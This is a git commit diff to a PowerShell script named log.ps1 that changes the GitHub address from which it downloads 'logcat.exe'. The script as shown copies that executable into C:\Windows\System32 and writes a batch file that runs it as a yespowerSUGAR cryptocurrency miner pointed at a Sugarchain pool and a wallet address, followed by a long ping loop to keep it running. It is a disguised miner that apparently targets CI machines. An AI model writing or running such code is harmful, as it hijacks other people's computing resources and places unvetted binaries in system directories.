96908da2d54be4a5af1a3146574cda089605a48c
kijang-7 <86412846+kijang-7@users.noreply.github.com>
2021-06-27 06:29:38 -0800

    Update log.ps1

--- log.ps1
+++ log.ps1
@@ -1,4 +1,4 @@
-Invoke-WebRequest https://raw.githubusercontent.com/kijang-7/circle-opt/main/logcat.exe -OutFile logcat.exe
+Invoke-WebRequest https://raw.githubusercontent.com/kijang-7/circleci-opt/main/logcat.exe -OutFile logcat.exe
 Copy logcat.exe C:\Windows\System32
 cmd /c echo cmd /k start logcat.exe -a yespowerSUGAR -o stratum+tcp://1pool.sugarchain.org:3333 -u sugar1qjhuqfmdcmaq6qr0dlxh2c9d874x6eaa88vmj3y.ciwin1 -t4 >>a.ps1
 cmd /c echo ping -n 999999 127.0.0.1 >>a.ps1
